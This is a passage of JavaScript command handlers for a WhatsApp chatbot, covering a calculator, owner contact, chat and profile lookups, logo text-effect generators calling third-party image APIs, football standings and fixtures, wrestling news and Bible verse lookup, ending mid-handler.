            .replace(/abs\(/g, 'Math.abs(')
            .replace(/%/g, '/100')
            .replace(/deg/g, 'deg')
            .replace(/,/g, ';')
            .trim();

        // Validate expression for safety
        const safeRegex = /^[0-9+\-*/().\s\^%πesincoqrtanlgabMh\s]+$/i;
        if (!safeRegex.test(expr)) {
            return reply('❌ *Invalid characters in expression.*\nOnly numbers, basic operators, and math functions are allowed.');
        }

        let result;
        
        // Handle percentage calculations
        if (text.includes('%')) {
            const percentMatch = text.match(/(\d+)%\s*(of)?\s*(\d+)/i);
            if (percentMatch) {
                const percent = parseFloat(percentMatch[1]);
                const number = parseFloat(percentMatch[3]);
                result = (percent / 100) * number;
            }
        }
        
        // Handle unit conversions
        else if (text.includes('to')) {
            const conversionMatch = text.match(/(\d+)\s*(\w+)\s*to\s*(\w+)/i);
            if (conversionMatch) {
                const value = parseFloat(conversionMatch[1]);
                const fromUnit = conversionMatch[2].toLowerCase();
                const toUnit = conversionMatch[3].toLowerCase();
                
                result = convertUnits(value, fromUnit, toUnit);
                if (result !== undefined) {
                    reply(`*Conversion:* ${value} ${fromUnit} = ${result} ${toUnit}`);
                    return;
                }
            }
        }

        // Evaluate mathematical expression
        if (result === undefined) {
            try {
                // Use Function constructor for safer evaluation
                result = Function('"use strict"; return (' + expr + ')')();
                
                // Check if result is valid
                if (typeof result !== 'number' || isNaN(result) || !isFinite(result)) {
                    throw new Error('Invalid result');
                }
                
            } catch (evalError) {
                console.error('Calculation error:', evalError);
                return reply('❌ *Could not calculate the expression.*\nPlease check your syntax and try again.');
            }
        }

        // Format the result
        let formattedResult = result;
        if (Number.isInteger(result)) {
            formattedResult = result.toString();
        } else {
            formattedResult = result.toFixed(6).replace(/\.?0+$/, '');
        }

        // Create response
        const calculationResponse = `
🧮 *CALCULATION RESULT*

*Expression:* ${text}
*Result:* ${formattedResult}

*Full precision:* ${result}
        `.trim();

        reply(calculationResponse);

    } catch (error) {
        console.error('Error in calculate command:', error);
        reply(mess.error);
    }
    
}
break
case "owner": {
    try {
        // Get the owner number from SettingsManager
        const ownernumber = getSetting(botNumber, 'ownernumber', '256742932677');
        const ownername = getSetting(botNumber, 'ownername', 'Owner');
        
        // Format the number
        const cleanNumber = String(ownernumber).replace(/\D/g, '');
        const ownerJid = cleanNumber + '@s.whatsapp.net';
        
        // Create contact vcard
        const ownerContact = [{
            displayName: ownername,
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${ownername}\nFN:${ownername}\nitem1.TEL;waid=${cleanNumber}:${cleanNumber}\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
        }];

        // Send the contact
        await conn.sendMessage(
            m.chat,
            { 
                contacts: { 
                    displayName: `Owner Contact`, 
                    contacts: ownerContact 
                }
            },
            { quoted: m }
        );
        
        // Also send a text message with owner info
        reply(`👑 *Owner Information*\n\n• *Name:* ${ownername}\n• *Number:* ${cleanNumber}\n• *WhatsApp:* wa.me/${cleanNumber}`);
        
    } catch (error) {
        console.error('Error sending owner contact:', error.message);
        reply(mess.error);
    }
    
}
break
case "listpc": {
if (!Access) return reply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
reply(teks)
}
break
case 'getbisnis': case 'getbusiness': {
  let input = m.quoted ? m.quoted.sender : text || m.sender;
  input = input.replace(/[^+\d]/g, '');
  let target;
  if (input.startsWith('+')) {
    target = input.slice(1).replace(/^0+/, '') + '@s.whatsapp.net';
  } else if (input.startsWith('0')) {
    target = '254' + input.slice(1) + '@s.whatsapp.net';
  } else if (input.startsWith('62')) {
    target = input + '@s.whatsapp.net';
  } else if (input.includes('@s.whatsapp.net')) {
    target = input;
  } else {
    target = '256' + input + '@s.whatsapp.net';
  }

  try {
    const profile = await bot.getBusinessProfile(target);
    const name = await bot.getName(target); 
    const pfp = await bot.profilePictureUrl(target, 'image').catch(() => null);
    const desc = profile.description || 'invalid.';
    const category = profile.category ||'invalid';
    const website = profile.website || 'invalid';
    const address = profile.address || 'invalid';
    const email = profile.email || 'invalid';
    const caption = `*📇Business profile*\n\n` +
      `*👤 Name:* ${name}\n` +
      `*🏢 Category:* ${category}\n` +
      `*🌐 Website:* ${website}\n` +
      `*📍 Address:* ${address}\n` +
      `*✉️ Email:* ${email}\n\n` +
      `*📝 Description:*\n${desc}`;
    if (pfp) {
      await bot.sendMessage(m.chat, {
        image: { url: pfp },
        caption,
      }, { quoted: m });
    } else {
      m.reply(caption);
    }
  } catch (err) {
    console.error(err);
    m.reply(`${global.wm}`);
  }
}
break
case "botstatus": {
  const used = process.memoryUsage();
  const ramUsage = `${formatSize(used.heapUsed)} / ${formatSize(os.totalmem())}`;
  const freeRam = formatSize(os.freemem());
  
  // Properly await checkDiskSpace
  const disk = await checkDiskSpace(process.cwd()); 
  
  const latencyStart = performance.now();
  await reply("⏳ *Calculating ping...*");
  const latencyEnd = performance.now();
  const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;

  const { download, upload } = await checkBandwidth();
  const uptime = runtime(process.uptime());

      const response = `
      * BOT STATUS *

 *Ping:* ${ping}
 *Uptime:* ${uptime}
 *RAM Usage:* ${ramUsage}
 *Free RAM:* ${freeRam}
 *Disk Usage:* ${formatSize(disk.size - disk.free)} / ${formatSize(disk.size)}
 *Free Disk:* ${formatSize(disk.free)}
 *Platform:* ${os.platform()}
 *NodeJS Version:* ${process.version}
 *CPU Model:* ${os.cpus()[0].model}
 *Downloaded:* ${download}
 *Uploaded:* ${upload}
`;
  await conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
  
}
break
case "getabout": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) {
      return reply('Reply to a user to get their about/bio.');
    }

    const userId = m.quoted.sender;

    try {
      const { status, setAt } = await conn.fetchStatus(userId);
      const formattedDate = moment(setAt).format("MMMM Do YYYY, h:mm:ss A");

      await conn.sendMessage(m.chat, { 
        text: `💢 *About of:* @${userId.split('@')[0]}\n\n"${status}"\n\n🕒 *Set at:* ${formattedDate}`,
        mentions: [userId] 
      }, { quoted: m });

    } catch {
      reply(mess.error);
    }
}
break
case "smartphone":
case "gsmarena": {
    if (!text) return reply("*Please provide a query to search for smartphones.*");

    try {
      const apiUrl = `${global.mess.siputzx}/api/s/gsmarena?query=${encodeURIComponent(text)}`;
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.status || !result.data || result.data.length === 0) {
        return reply("*No results found. Please try another query.*");
      }

      const limitedResults = result.data.slice(0, 10);
      let responseMessage = `*Top 10 Results for "${text}":*\n\n`;

      for (let item of limitedResults) {
        responseMessage += `📱 *Name:* ${item.name}\n`;
        responseMessage += `📝 *Description:* ${item.description}\n`;
        responseMessage += `🌐 [View Image](${item.thumbnail})\n\n`;
      }

      reply(responseMessage);
    } catch (error) {
      console.error('Error fetching results from GSMArena API:', error);
      reply(mess.error);
    }
}
break
case "time": {
    try {
        let countryName = text.trim();
        
        if (!countryName) {
            // If no country provided, show current bot time
            const now = moment().tz(global.timezones || "Africa/Kampala");
            const timeInfo = `
 *Current Bot Time* 

🌍 *Timezone:* ${now.format('z (Z)')}
 *Date:* ${now.format('dddd, MMMM Do YYYY')}
 *Time:* ${now.format('h:mm:ss A')}
 *Week Number:* ${now.format('WW')}
 *Day of Year:* ${now.format('DDD')}

*Usage:* ${prefix}time [country name]
*Example:* ${prefix}time Japan
            `.trim();

            return await conn.sendMessage(m.chat, { 
    text: `${global.wm}\n\n${timeInfo}`
}, { quoted: m });
  
  }

        // Get timezone for the country
        const timezones = moment.tz.zonesForCountry(countryName);
        
        if (!timezones || timezones.length === 0) {
            return reply(`❌ *Country not found!*\nPlease provide a valid country name.\n\nExample: ${prefix}time Japan`);
        }

        // Use the first timezone for that country
        const primaryTimezone = timezones[0];
        const now = moment().tz(primaryTimezone);
        
        const timeInfo = `
⏰ *Time in ${countryName.toUpperCase()}* ⏰

🌍 *Timezone:* ${primaryTimezone} (${now.format('Z')})
📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
🕒 *Time:* ${now.format('h:mm:ss A')}
🕛 *24-hour format:* ${now.format('HH:mm:ss')}
📆 *Week Number:* ${now.format('WW')}
⏳ *Day of Year:* ${now.format('DDD')}

*Other timezones in ${countryName}:* ${timezones.slice(0, 5).join(', ')}${timezones.length > 5 ? '...' : ''}
        `.trim();

        await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });

    } catch (error) {
        console.error('Error in time command:', error);
        reply('❌ *Unable to fetch time information.*\nPlease try a different country name or try again later.');
    }
    
}
// ===== EOHOT EFFECTS ============
break
case "glossysilver": {
    try {
        if (!text) return reply('Please provide text. Example: .glossysilver Hello World');
        
        let query = text.trim();
        let res = await fetch(`https://api.giftedtech.co.ke/api/photooxy/glossy-silver?apikey=gifted&text=${encodeURIComponent(query)}`);
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        // Check if the response has the expected structure
        if (json && json.success && json.result && json.result.image_url) {
            await conn.sendMessage(m.chat, { 
                image: { url: json.result.image_url },
                caption: `✨ Glossy Silver Text: ${query}`
            }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error generating glossy silver text:', error);
        reply(mess.error);
    }
}
break
case 'arting': {
    if (!text) return reply('Provide text! Example: .arting girl wearing glasses');
    await conn.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
    
    try {
        await conn.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }, caption: `> ${global.wm}`}, { quoted: m });
    } catch (err) {
        console.log(err.message);
        conn.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
        reply(mess.error);
    }
}  
break   
case " advancedglow": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}advancedglow Kevin*`);
    }

    const link = "https://en.ephoto360.com/advanced-glow-effects-74.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in advancedglow command:", error);
      reply(mess.error);
      }
}
break
case "blackpinklogo": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinklogo Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinklogo command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "blackpinkstyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinkstyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinkstyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "cartoonstyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}cartoonstyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in cartoonstyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "deadpool": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}deadpool Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in deadpool command:", error);
      reply("*An error occurred while generating the effect.*");
    }
} 
break
case "effectclounds": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}effectclouds Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in effectclouds command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "flagtext": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}flagtext Kevin*`);
    }

    const link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in flagtext command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "freecreate": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}freecreate Kevin*`);
    }

    const link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in freecreate command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "galaxystyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}galaxystyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in galaxystyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "galaxywallpaper": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}galaxywallpaper Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in galaxywallpaper command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "makingneon": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}makingneon Kevin*`);
    }

    const link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in makingneon command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
case "matrix": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}matrix Kevin*`);
    }

    const link = "https://en.ephoto360.com/matrix-text-effect-154.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in matrix command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case"royaltext": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}royaltext Kevin*`);
    }

    const link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in royaltext command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "sand": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}sand Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in sand command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "summerbeach": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}summerbeach Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in summerbeach command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "topography": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}topography Tylor*`);
    }

    const link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in topography command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "typography": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}typography Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in typography command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "luxurygold": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}luxurygold Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in luxurygold command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case 'royal': {
    if (!text) return reply(`*Example: ${prefix}royal Kelvin*`);
    
    try {
        await reply('👑 Creating royal logo... Please wait ⏳');
        
        const apiUrl = `https://api.nekolabs.my.id/ephoto/royal-text?text=${encodeURIComponent(text)}`;
        
        // Send image directly from URL
        await conn.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `> ${global.wm}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Royal command error:', error);
        reply('Error generating logo. Please try again later.');
    }
}
break;
case 'textonwetglass': {
    if (!text) return reply(`*Example: ${prefix}textonwetglass Kelvin*`);
    
    try {
        await reply('💧 Creating text on wet glass effect... Please wait ⏳');
        
        const apiUrl = `https://api.nekolabs.web.id/ephoto/text-on-wet-glass?text=${encodeURIComponent(text)}`;
        
        // Send image directly from URL
        await conn.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `> ${global.wm}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('TextOnWetGlass command error:', error);
        reply('❌ Error generating wet glass effect. Please try again later.');
    }
}
break
case 'bear': {
    if (!text) return reply(`*Example: ${prefix}bear Kelvin*`);
    
    try {
        await reply('🐻 Creating bear logo... Please wait ⏳');
        
        const apiUrl = `https://api.nekolabs.my.id/ephoto/bear-logo?text=${encodeURIComponent(text)}`;
        
        // Send image directly from URL
        await conn.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `> ${global.wm}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Bear command error:', error);
        reply('Error generating logo. Please try again later.');
    }
}
break
case 'papercut':
case '3dpaper': {
    if (!text) return reply(`*Example: ${prefix}papercut Kelvin*`);
    
    try {
        await reply('✂️ Creating 3D paper cut style... Please wait ⏳');
        
        const apiUrl = `https://api.nekolabs.my.id/ephoto/3d-paper-cut-style?text=${encodeURIComponent(text)}`;
        
        // Send image directly from URL
        await conn.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `> ${global.wm}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Papercut command error:', error);
        reply('❌ Error generating logo. Please try again later.');
    }
}
break
case 'hologram':
case '3dhologram': {
    if (!text) return reply(`*Example: ${prefix}hologram Kelvin*`);
    
    try {
        await reply('✨ Creating 3D hologram text... Please wait ⏳');
        
        const apiUrl = `https://api.nekolabs.my.id/ephoto/3d-hologram-text?text=${encodeURIComponent(text)}`;
        
        // Send image directly from URL
        await conn.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `> ${global.wm}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Hologram command error:', error);
        reply('❌ Error generating hologram. Please try again later.');
    }
}
break
case 'balogo': {
    try {
        if (!text) {
            return reply(`🍀 *Enter two texts for the logo! (separate with |)*\n\n✨ *Example: ${prefix}balogo SXZ|Archive*`);
        }

        let [textL, textR] = text.split('|');
        if (!textL || !textR) {
            return reply(`☘️ *Wrong format! Use: ${prefix}balogo LeftText|RightText*`);
        }
        
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        let apiUrl = `https://api.nekolabs.my.id/canvas/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;
        let response = await fetch(apiUrl);
        if (!response.ok) {
            console.error('[ba-logo API Error]', response.status);
            return reply('🍂 *Failed to connect to logo maker API!*');
        }

        let buffer = Buffer.from(await response.arrayBuffer());

        await conn.sendMessage(
            m.chat,
            {
                image: buffer,
                caption: `> ${global.wm}`
            },
            { quoted: m }
        );

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error('[ba-logo Handler Error]', e);
        reply(`🍂 *Oops, failed to create logo!* \nDetail: ${e.message || e}`);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    
}
break
case 'tattoo': {
    try {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // Direct image URL approach
        let apiUrl = `https://api.nekolabs.my.id/random/nsfwhub/tattoo`;
        let response = await fetch(apiUrl);
        
        if (!response.ok) {
            console.error('[Tattoo API Error]', response.status);
            return reply('❌ *Failed to fetch tattoo image from API!*');
        }

        let buffer = Buffer.from(await response.arrayBuffer());

        await conn.sendMessage(
            m.chat,
            {
                image: buffer,
                caption: `> ${global.wm}`
            },
            { quoted: m }
        );

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error('[Tattoo Handler Error]', e);
        reply(`❌ *Oops, failed to generate tattoo!* \nError: ${e.message || e}`);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    
}
break
case "1917style": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}1917style Kelvin*`);
    }

    const link = "https://en.ephoto360.com/1917-style-text-effect-523.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in 1917style command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "multicoloredneon": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}multicoloredneon Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in multicoloredneon command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "dragonball": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}dragonball Kelvin*`);
    }

    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in dragonball command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "pixelglitch": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}pixelglitch Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in pixelglitch command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
// =====[Football standings command ===
case 'clstandings':
case 'championsleague':
  await sports.formatStandings('CL', 'UEFA Champions League', { m, reply });
  break;

case 'laligastandings':
case 'laliga':
  await sports.formatStandings('PD', 'La Liga', { m, reply });
  break;

case 'bundesligastandings':
case 'bundesliga':
  await sports.formatStandings('BL1', 'Bundesliga', { m, reply });
  break;

case 'serieastandings':
case 'seriea':
  await sports.formatStandings('SA', 'Serie A', { m, reply });
  break;

case 'ligue1standings':
case 'ligue1':
  await sports.formatStandings('FL1', 'Ligue 1', { m, reply });
  break;

case 'elstandings':
case 'europaleague':
  await sports.formatStandings('EL', 'Europa League', { m, reply });
  break;

case 'eflstandings':
case 'championship':
  await sports.formatStandings('ELC', 'EFL Championship', { m, reply });
  break;

case 'wcstandings':
case 'worldcup':
  await sports.formatStandings('WC', 'World Cup', { m, reply });
  break;

case 'eplstandings':
case 'plstandings':
case 'premierleaguestandings':
  await sports.formatStandings('PL', 'Premier League', { m, reply });
  break;

// Football Matches Commands
case 'eplmatches':
case 'plmatches':
  await sports.formatMatches('PL', 'Premier League', { m, reply });
  break;

case 'clmatches':
case 'championsleaguematches':
  await sports.formatMatches('CL', 'UEFA Champions League', { m, reply });
  break;

case 'laligamatches':
case 'pdmatches':
  await sports.formatMatches('PD', 'La Liga', { m, reply });
  break;

case 'bundesligamatches':
case 'bl1matches':
  await sports.formatMatches('BL1', 'Bundesliga', { m, reply });
  break;

case 'serieamatches':
case 'samatches':
  await sports.formatMatches('SA', 'Serie A', { m, reply });
  break;

case 'ligue1matches':
case 'fl1matches':
  await sports.formatMatches('FL1', 'Ligue 1', { m, reply });
  break;

case 'elmatches':
case 'europaleaguematches':
  await sports.formatMatches('EL', 'Europa League', { m, reply });
  break;

case 'eflmatches':
case 'elcmatches':
  await sports.formatMatches('ELC', 'EFL Championship', { m, reply });
  break;

case 'wcmatches':
case 'worldcupmatches':
  await sports.formatMatches('WC', 'World Cup', { m, reply });
  break;

// Football Top Scorers Commands
case 'eplscorers':
case 'plscorers':
  await sports.formatTopScorers('PL', 'Premier League', { m, reply });
  break;

case 'clscorers':
case 'championsleaguescorers':
  await sports.formatTopScorers('CL', 'UEFA Champions League', { m, reply });
  break;

case 'laligascorers':
case 'pdscorers':
  await sports.formatTopScorers('PD', 'La Liga', { m, reply });
  break;

case 'bundesligascorers':
case 'bl1scorers':
  await sports.formatTopScorers('BL1', 'Bundesliga', { m, reply });
  break;

case 'serieascorers':
case 'sascorers':
  await sports.formatTopScorers('SA', 'Serie A', { m, reply });
  break;

case 'ligue1scorers':
case 'fl1scorers':
  await sports.formatTopScorers('FL1', 'Ligue 1', { m, reply });
  break;

case 'elscorers':
case 'europaleaguescorers':
  await sports.formatTopScorers('EL', 'Europa League', { m, reply });
  break;

case 'eflscorers':
case 'elcscorers':
  await sports.formatTopScorers('ELC', 'EFL Championship', { m, reply });
  break;

case 'wcscorers':
case 'worldcupscorers':
  await sports.formatTopScorers('WC', 'World Cup', { m, reply });
  break;

// Football Upcoming Matches Commands
case 'eplupcoming':
case 'plupcoming':
  await sports.formatUpcomingMatches('PL', 'Premier League', { m, reply });
  break;

case 'clupcoming':
case 'championsleagueupcoming':
  await sports.formatUpcomingMatches('CL', 'UEFA Champions League', { m, reply });
  break;

case 'laligaupcoming':
case 'pdupcoming':
  await sports.formatUpcomingMatches('PD', 'La Liga', { m, reply });
  break;

case 'bundesligaupcoming':
case 'bl1upcoming':
  await sports.formatUpcomingMatches('BL1', 'Bundesliga', { m, reply });
  break;

case 'serieaupcoming':
case 'saupcoming':
  await sports.formatUpcomingMatches('SA', 'Serie A', { m, reply });
  break;

case 'ligue1upcoming':
case 'fl1upcoming':
  await sports.formatUpcomingMatches('FL1', 'Ligue 1', { m, reply });
  break;

case 'elupcoming':
case 'europaleagueupcoming':
  await sports.formatUpcomingMatches('EL', 'Europa League', { m, reply });
  break;

case 'eflupcoming':
case 'elcupcoming':
  await sports.formatUpcomingMatches('ELC', 'EFL Championship', { m, reply });
  break;

case 'wcupcoming':
case 'worldcupupcoming':
  await sports.formatUpcomingMatches('WC', 'World Cup', { m, reply });
  break;

// Wrestling Commands
case 'wweevents':
case 'wrestlingevents':
  await sports.getWrestlingEvents({ m, reply });
  break;

case 'wwenews':
case 'wwe':
  await sports.getWWENews({ m, reply });
  break;

case 'wweschedule':
case 'wweevents':
  await sports.getWWESchedule({ m, reply });
  break;
//======[RELIGION MENU CMDS]==
case 'bible': {
const BASE_URL = "https://bible-api.com";

    try {
      let chapterInput = text.split(" ").join("").trim();
      if (!chapterInput) {
        throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} John 3:16*`);
      }
      chapterInput = encodeURIComponent(chapterInput);
      let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
      if (!chapterRes.ok) {
        throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} John 3:16*`);
      }
      
      let chapterData = await chapterRes.json();
      let bibleChapter = `
*The Holy Bible*\n
*Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
*Chapter Content:*\n
${chapterData.text}\n`;
      
      reply(bibleChapter);
    } catch (error) {
      reply(mess.error);
